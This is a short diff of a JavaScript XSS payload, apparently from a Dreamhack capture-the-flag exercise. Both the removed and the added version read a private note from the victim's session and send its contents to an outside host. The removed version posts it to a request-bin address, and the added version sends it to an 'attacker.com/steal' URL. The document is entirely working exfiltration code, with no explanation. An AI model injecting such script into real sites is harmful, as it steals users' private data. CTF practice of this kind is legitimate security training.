@@ -1,14 +1,7 @@
-<!DOCTYPE html>
-<html>
-<body>
 <script>
-fetch("http://158.247.241.230:15667/note?id=4")
+fetch("/note?id=4")
   .then(r => r.text())
-  .then(data => fetch("https://rggwbkr.request.dreamhack.games", {
-    method: "POST",
-    mode: "no-cors",
-    body: data
-  }));
+  .then(t => {
+    fetch("http://attacker.com/steal?data=" + encodeURIComponent(t))
+  })
 </script>
-</body>
-</html>
